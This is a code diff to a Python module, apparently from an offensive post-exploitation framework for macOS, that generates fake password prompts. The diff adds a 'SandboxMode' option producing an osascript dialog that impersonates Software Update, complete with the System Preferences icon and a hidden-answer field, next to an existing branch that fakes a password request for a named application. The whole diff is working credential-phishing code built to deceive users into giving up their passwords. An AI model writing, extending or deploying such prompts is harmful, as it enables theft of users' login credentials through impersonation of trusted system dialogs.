@@ -58,6 +58,12 @@ class Module:
                 'Description'   :   'Switch. List applications suitable for launching.',
                 'Required'      :   False,
                 'Value'         :   ''
+            },
+            'SandboxMode' : {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Switch. Launch a sandbox safe prompt',
+                'Required'      :   False,
+                'Value'         :   ''
             }
         }
 
@@ -76,11 +82,11 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         listApps = self.options['ListApps']['Value']
         appName = self.options['AppName']['Value']
-
+        sandboxMode = self.options['SandboxMode']['Value']
         if listApps != "":
             script = """
 import os
@@ -94,8 +100,16 @@ print '\\n'.join(choices)
 """
 
         else:
-            # osascript prompt for the specific application
-            script = """
+            if sandboxMode != "":
+                # osascript prompt for the current application with System Preferences icon
+                script = """
+import os
+print os.popen('osascript -e \\\'display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with icon file "Applications:System Preferences.app:Contents:Resources:PrefApp.icns" with hidden answer with title "Software Update"\\\'').read()
+"""
+
+            else:
+                # osascript prompt for the specific application
+                script = """
 import os
 print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
 """ % (appName, appName, appName, appName)
